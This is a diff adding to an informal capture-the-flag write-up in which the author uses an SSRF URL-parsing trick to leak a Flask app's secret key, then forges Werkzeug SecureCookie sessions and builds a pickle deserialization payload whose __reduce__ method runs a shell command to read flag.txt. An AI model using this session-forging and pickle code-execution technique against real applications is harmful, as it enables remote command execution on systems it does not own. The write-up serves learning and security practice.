@@ -183,6 +183,96 @@ that abuse url parsing in diffrent programing languages , even browsers
 
 [A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
 
-after reading this paper if figure out how to push the 
+after reading this paper if figure out how to push the url path to query
 
+like this 
+
+> [link]http://127.0.0.1:5000///flaginfo
+
+and bingo we got the environment variables with secret key 
+
+> SECRET_KEY = 'superdupersecretflagonkey'
+
+![NikoCat](https://screenshotscdn.firefoxusercontent.com/images/9ef38443-ae5d-4018-9b11-b16302746489.png)
+
+so we did fine with all this steps , challenge main goal is to read flag located in flag.txt
+
+hmmmm ? , so we need an RCE at least , after another dig in the sources we found this 
+```python
+class Request(BaseRequest):
+    @cached_property
+    def session(self):
+        data = self.cookies.get("session_data")
+        if not data:
+            return SecureCookie(secret_key=SECRET_KEY)
+        return SecureCookie.unserialize(data, SECRET_KEY)
+```
+
+> unserialize maybe an object injection ?????
+
+SecureCookie is library let's check it 
+```python
+from werkzeug.contrib.securecookie import SecureCookie
+```
+after dig in github 
+
+https://github.com/pallets/werkzeug/blob/master/werkzeug/contrib/securecookie.py
+
+SecureCookie uses pickle 
+
+let's try some tests on session first
+
+let's write code that decrypt session 
+
+```python
+from werkzeug.contrib.securecookie import SecureCookie
+
+SECRET_KEY = 'superdupersecretflagonkey'
+data = "YWzU8XcjGIq5lmuao7nR65VW3yg=?name=gANYCAAAAE5la28gQ2F0cQAu&username=gANYDQAAAG1lb3dfYzdkM2M1MDhxAC4="
+```
+
+output : 
+> <SecureCookie {'name': 'Neko Cat', 'username': 'meow_c7d3c508'}>
+
+we succeed in decrypting session let's try now to encrypt the session with difrrent name 
+```python
+import os
+import subprocess
+
+from werkzeug.contrib.securecookie import SecureCookie
+
+SECRET_KEY = 'superdupersecretflagonkey'
+payload = {'name': '0xdeadbeef', 'username': 'meow_326dcae5'}
+
+x = SecureCookie(payload, SECRET_KEY)
+
+value = x.serialize()
+print(value)
+```
+let's update our session and see the changes now 
+![NikoCat](https://screenshotscdn.firefoxusercontent.com/images/345e4fb3-f290-47fd-a4f8-60743ee88d2c.png)
+
+nice name changed ^^
+
+i'll try to inject an class object to read the flag 
+```python
+import os
+import subprocess
+
+from werkzeug.contrib.securecookie import SecureCookie
+
+class Pwn(object):
+      def __reduce__(self):
+        return (subprocess.check_output, (['cat','flag.txt'],))
+
+SECRET_KEY = 'superdupersecretflagonkey'
+
+payload = {'name': Pwn() , 'username': 'meow_326dcae5'}
+
+x = SecureCookie(payload, SECRET_KEY)
+
+value = x.serialize()
+print(value)
+print(SecureCookie.unserialize(value, SECRET_KEY))
+```
 
